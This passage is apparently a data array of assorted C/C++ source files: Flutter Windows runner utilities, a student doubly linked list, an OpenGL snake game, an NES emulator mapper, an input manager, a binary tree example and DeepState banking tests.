command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include \"openGLPart.h\"\nvoid bunny(double size, Point loc) {\n    glPushMatrix();\n    glTranslatef(loc.x, loc.y, loc.z);\n    glScalef(size, size, size);\n    glBegin(GL_TRIANGLES);\n    for (int i = 0; i < faces.size();i += 3) {\n        glVertex3f(vertices[3 * faces[i]], vertices[3 * faces[i] + 1], vertices[3 * faces[i] + 2]);\n        glVertex3f(vertices[3 * faces[i + 1]], vertices[3 * faces[i + 1] + 1], vertices[3 * faces[i + 1] + 2]);\n        glVertex3f(vertices[3 * faces[i + 2]], vertices[3 * faces[i + 2] + 1], vertices[3 * faces[i + 2] + 2]);\n    }\n    glEnd();\n    glPopMatrix();\n}\n\nPoint randomBunnyLocation(int x, int y, int z, int max, int except) {\n    while (true) {\n        Point loc = { (x - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (y - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (z - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5) };\n        bool acceptable = true;\n        for (int i = 0;i <= bodySegments - 1;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            int next = (current + 1) % MAX_SEGMENTS;\n            Point p = diff(snakeBody[next], snakeBody[current]);\n            if (p.x != 0 && (loc.x - snakeBody[current].x) * (loc.x - snakeBody[next].x) <= 0 &&\n                (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.y != 0 && (loc.y - snakeBody[current].y) * (loc.y - snakeBody[next].y) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.z != 0 && (loc.z - snakeBody[current].z) * (loc.z - snakeBody[next].z) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i <= bodySegments;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            if ((snakeBody[current].x - loc.x) * (snakeBody[current].x - loc.x) +\n                (snakeBody[current].y - loc.y) * (snakeBody[current].y - loc.y) +\n                (snakeBody[current].z - loc.z) * (snakeBody[current].z - loc.z) <=\n                (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i < max;i++) {\n            if (i == except)\n                continue;\n            if (euclideanDistanceSquare(loc, bunnyLocation[i]) <= 4 * DEFAULT_BUNNY_SIZE * DEFAULT_BUNNY_SIZE) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (acceptable)\n            return loc;\n    }\n}\nint eatsBunny() {\n    int head = (bodySegments + firstIndex) % MAX_SEGMENTS;\n    for (int i = 0; i < DEFAULT_NUMBER_OF_BUNNIES;i++)\n        if (euclideanDistanceSquare(snakeBody[head], bunnyLocation[i]) <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE))\n            return i;\n    return -1;\n}\nbool snakeCrossesItself() {\n    int head0 = (bodySegments + firstIndex - 1) % MAX_SEGMENTS;\n    int head1 = (head0 + 1) % MAX_SEGMENTS;\n    Point direction = diff(snakeBody[head1], snakeBody[head0]);\n    for (int i = 0;i <= bodySegments - 2;i++) {\n        int current = (i + firstIndex) % MAX_SEGMENTS;\n        int next = (current + 1) % MAX_SEGMENTS;\n        Point p = diff(snakeBody[next], snakeBody[current]);\n        if (direction.x == 0 && p.x == 0) {//on y-z plane\n            if (snakeBody[head0].x != snakeBody[current].x)\n                continue;\n            if (direction.y == 0 && p.y == 0) {\n                if (snakeBody[head0].y == snakeBody[current].y &&\n                    ((snakeBody[head0].z - snakeBody[current].z) * (snakeBody[head0].z - snakeBody[next].z) < 0 ||\n                        (snakeBody[head1].z - snakeBody[current].z) * (snakeBody[head1].z - snakeBody[next].z) < 0))\n                    return true;\n            }\n            if (direction.z == 0 && p.z == 0) {\n                if (snakeBody[head0].z == snakeBody[current].z &&\n                    ((snakeBody[head0].y - snakeBody[current].y) * (snakeBody[head0].y - snakeBody[next].y) < 0 ||\n    ",
    "\ufeff#include\t\"..\\..\\DLL\\d_iNES.h\"\n\nnamespace {\nuint8_t\t\treg;\n\t\nvoid\tsync (void) {\n\tif (ROM->INES2_SubMapper ==0) reg =ROM->dipValue |0x20;\n\tif (~reg &0x20) {\n\t\tEMU->SetPRG_ROM8(0x8, 0x40);\n\t\tEMU->SetPRG_ROM8(0xA, 0x40);\n\t\tEMU->SetPRG_ROM8(0xC, 0x40);\n\t\tEMU->SetPRG_ROM8(0xE, 0x40);\n\t} else\n\tif ((reg &0x1F) <2)\n\t\tEMU->SetPRG_ROM32(0x8, reg >>1 &0x0F);\n\telse {\n\t\tEMU->SetPRG_ROM16(0x8, reg &0x1F);\n\t\tEMU->SetPRG_ROM16(0xC, reg &0x1F);\n\t}\n\tEMU->SetCHR_ROM8(0x0, reg);\n\tif (reg &0x10)\n\t\tEMU->Mirror_H();\n\telse\n\t\tEMU->Mirror_V();\n}\n\nvoid\tMAPINT\twriteReg (int bank, int addr, int val) {\n\tEMU->WriteAPU(bank, addr, val);\n\tif (addr &0x100) {\n\t\treg =val;\n\t\tsync();\n\t}\n}\n\nvoid\tMAPINT\treset (RESET_TYPE resetType) {\n\treg =0;\n\tsync();\n\tif (ROM->INES2_SubMapper ==1) EMU->SetCPUWriteHandler(0x4, writeReg);\n}\n\nint\tMAPINT\tsaveLoad (STATE_TYPE stateMode, int offset, unsigned char *data) {\n\tif (stateMode ==STATE_LOAD) sync();\n\treturn offset;\n}\n\nuint16_t mapperNum =360;\n} // namespace\n\nMapperInfo MapperInfo_360 ={\n\t&mapperNum,\n\t_T(\"\u666e\u6fa4 P3150\"),\n\tCOMPAT_FULL,\n\tNULL,\n\treset,\n\tNULL,\n\tNULL,\n\tNULL,\n\tsaveLoad,\n\tNULL,\n\tNULL\n};\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sms_email_flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Input.h\"\n#include <hidusage.h>\n\n// Singleton requirement\nInput* Input::instance;\n\n// --------------- Basic usage -----------------\n// \n// This class is set up as a singleton, meaning there\n// is only ever one instance of the class.  You can\n// access that instance through the static GetInstance()\n// function, like so:\n// \n//   Input::GetInstance().SomeFunctionHere()\n// \n// To make your code less verbose, I suggest storing\n// a reference to this instance in a temporary variable\n// if you plan on call multiple functions in a row:\n// \n//   Input& input = Input::GetInstance();\n//   if (input.KeyDown('W')) { }\n//   if (input.KeyDown('A')) { }\n//   if (input.KeyDown('S')) { }\n//   if (input.KeyDown('D')) { }\n// \n// \n// The keyboard functions all take a single character\n// like 'W', ' ' or '8' (which will implicitly cast \n// to an int) or a pre-defined virtual key code like\n// VK_SHIFT, VK_ESCAPE or VK_TAB. These virtual key\n// codes are are accessible through the Windows.h \n// file (already included in Input.h). See the \n// following for a complete list of virtual key codes:\n// https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n// \n// Checking if various keys are down or up:\n// \n//   Input& input = Input::GetInstance();\n//   if (input.KeyDown('W')) { }\n//   if (input.KeyUp('2')) { }\n//   if (input.KeyDown(VK_SHIFT)) { }\n//\n// \n// Checking if a key was initially pressed or released \n// this frame:  \n// \n//   Input& input = Input::GetInstance();\n//   if (input.KeyPressed('Q')) { }\n//   if (input.KeyReleased(' ')) { }\n// \n// (Note that these functions will only return true on \n// the FIRST frame that a key is pressed or released.)\n// \n// \n// Checking for mouse button input is similar:\n// \n//   Input& input = Input::GetInstance();\n//   if (input.MouseLeftDown()) { }\n//   if (input.MouseRightDown()) { }\n//   if (input.MouseMiddleUp()) { }\n//   if (input.MouseLeftPressed()) { }\n//   if (input.MouseRightReleased()) { }\n//\n// \n// To handle relative mouse movement, you can use either\n// \"standard\" or \"raw\" mouse input, as shown below:  \n// \n//  - *Standard* input simply reads the cursor position on\n//    the screen each frame and calculates the delta,\n//    which respects pointer acceleration.  Use these\n//    functions if you expect the same pointer behavior\n//    as your mouse cursor in Windows.\n// \n//       Input& input = Input::GetInstance();\n//       int xDelta = input.GetMouseXDelta();\n//       int yDelta = input.GetMouseYDelta();\n// \n//  - *Raw* input is read directly from the device, and is\n//    a measure of how far the *mouse* moved, not the *cursor*.\n//    Use these functions if you want high-precision movements\n//    independent of the operating system or screen pixels.\n// \n//       Input& input = Input::GetInstance();\n//       int xRawDelta = input.GetRawMouseXDelta();\n//       int yRawDelta = input.GetRawMouseYDelta();\n//                                ^^^\n//  \n// ---------------------------------------------\n\n\n// --------------------------\n//  Cleans up the key arrays\n// --------------------------\nInput::~Input()\n{\n\tdelete[] kbState;\n\tdelete[] prevKbState;\n}\n\n// ---------------------------------------------------\n//  Initializes the input variables and sets up the\n//  initial arrays of key states\n//\n//  windowHandle - the handle (id) of the window,\n//                 which is necessary for mouse input\n// ---------------------------------------------------\nvoid Input::Initialize(HWND windowHandle)\n{\n\tkbState = new unsigned char[256];\n\tprevKbState = new unsigned char[256];\n\n\tmemset(kbState, 0, sizeof(unsigned char) * 256);\n\tmemset(prevKbState, 0, sizeof(unsigned char) * 256);\n\n\twheelDelta = 0.0f;\n\tmouseX = 0; mouseY = 0;\n\tprevMouseX = 0; prevMouseY = 0;\n\tmouseXDelta = 0; mouseYDelta = 0;\n\tkeyboardCaptured = false; mouseCaptured = false;\n\n\tthis->windowHandle = windowHandle;\n\n\t// Register for raw input from the mouse\n\tRAWINPUTDEVICE mouse = {};\n\tmouse.usUsagePage = HID_USAGE_PAGE_GENERIC;\n\tmouse.usUsage = HID_USAGE_GENERIC_MOUSE;\n\tmouse.dwFlags = RIDEV_INPUTSINK;\n\tmouse.hwndTarget = windowHandle;\n\tRegisterRawInputDevices(&mouse, 1, sizeof(mouse));\n}\n\n// ----------------------------------------------------------\n//  Updates the input manager for this frame.  This should\n//  be called at the beginning of every Game::Update(), \n//  before anything that might need input\n// ----------------------------------------------------------\nvoid Input::Update()\n{\n\t// Copy the old keys so we have last frame's data\n\tmemcpy(prevKbState, kbState, sizeof(unsigned char) * 256);\n\n\t// Get the latest keys (from Windows)\n\t// Note the use of (void), which denotes to the compiler\n\t// that we're intentionally ignoring the return value\n\t(void)GetKeyboardState(kbState);\n\n\t// Get the current mouse position then make it relative to the window\n\tPOINT mousePos = {};\n\tGetCursorPos(&mousePos);\n\tScreenToClient(windowHandle, &mousePos);\n\n\t// Save the previous mouse position, then the current mouse \n\t// position and",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n// Definition for a binary tree node.\r\nstruct TreeNode {\r\n    int val;\r\n    TreeNode *left;\r\n    TreeNode *right;\r\n    TreeNode(int x) : val(x), left(NULL), right(NULL) {}\r\n};\r\n\r\nclass Solution {\r\npublic:\r\n    int findProduct(TreeNode* root) {\r\n        if (root == nullptr) return 1;\r\n        int product = root->val;\r\n        product *= findProduct(root->left);\r\n        product *= findProduct(root->right);\r\n        return product;\r\n    }\r\n};\r\n\r\nint main() {\r\n    // Example binary tree\r\n    TreeNode* root = new TreeNode(3);\r\n    root->left = new TreeNode(9);\r\n    root->right = new TreeNode(20);\r\n    root->right->left = new TreeNode(15);\r\n    root->right->right = new TreeNode(7);\r\n\r\n    Solution sol;\r\n    cout << \"Product of all values in the binary tree: \" << sol.findProduct(root) << endl;\r\n\r\n    // Clean up memory\r\n    delete root->right->left;\r\n    delete root->right->right;\r\n    delete root->right;\r\n    delete root->left;\r\n    delete root;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <deepstate/DeepState.hpp>\r\n#include \"banking_system.h\"\r\n\r\nusing namespace deepstate;\r\n\r\nTEST(BankingSystemPropertyTest, AccountCreation)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    std::string owner_name = DeepState_CStrUpToLen(MAX_NAME_LENGTH);\r\n    double initial_balance = DeepState_DoubleInRange(1.0, 1000.0);\r\n    bankingSystem.createAccount(account_number, owner_name, initial_balance);\r\n\r\n    Account *account = bankingSystem.findAccount(account_number);\r\n    ASSERT(account != nullptr);\r\n    ASSERT_EQ(account->account_number, account_number);\r\n    ASSERT_EQ(account->owner, owner_name);\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, Deposit)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(1.0, 1000.0);\r\n    double deposit_amount = DeepState_DoubleInRange(1.0, 100.0);\r\n    bankingSystem.createAccount(account_number, \"TestOwner\", initial_balance);\r\n    bankingSystem.deposit(account_number, deposit_amount);\r\n\r\n    Account *account = bankingSystem.findAccount(account_number);\r\n    ASSERT(account != nullptr);\r\n    ASSERT_EQ(account->balance, initial_balance + deposit_amount);\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, Withdrawal)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(100.0, 1000.0);\r\n    double withdraw_amount = DeepState_DoubleInRange(1.0, initial_balance);\r\n    bankingSystem.createAccount(account_number, \"TestOwner\", initial_balance);\r\n    bankingSystem.withdraw(account_number, withdraw_amount);\r\n\r\n    Account *account = bankingSystem.findAccount(account_number);\r\n    ASSERT(account != nullptr);\r\n    ASSERT_EQ(account->balance, initial_balance - withdraw_amount);\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, Transfer)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int source_account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    int dest_account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(100.0, 1000.0);\r\n    double transfer_amount = DeepState_DoubleInRange(1.0, initial_balance);\r\n    bankingSystem.createAccount(source_account_number, \"SourceOwner\", initial_balance);\r\n    bankingSystem.createAccount(dest_account_number, \"DestOwner\", initial_balance);\r\n    bankingSystem.transfer(source_account_number, dest_account_number, transfer_amount);\r\n\r\n    Account *source_account = bankingSystem.findAccount(source_account_number);\r\n    Account *dest_account = bankingSystem.findAccount(dest_account_number);\r\n    ASSERT(source_account != nullptr);\r\n    ASSERT(dest_account != nullptr);\r\n    ASSERT_EQ(source_account->balance, initial_balance - transfer_amount);\r\n    ASSERT_EQ(dest_account->balance, initial_balance + transfer_amount);\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, InvalidWithdrawal)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(1.0, 100.0);\r\n    double withdraw_amount = DeepState_DoubleInRange(initial_balance + 1.0, 1000.0);\r\n    bankingSystem.createAccount(account_number, \"TestOwner\", initial_balance);\r\n    bankingSystem.withdraw(account_number, withdraw_amount);\r\n\r\n    Account *account = bankingSystem.findAccount(account_number);\r\n    ASSERT(account == nullptr); // Account should not exist due to invalid withdrawal\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, InvalidTransfer)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int source_account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    int dest_account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(1.0, 100.0);\r\n    double transfer_amount = DeepState_DoubleInRange(initial_balance + 1.0, 1000.0);\r\n    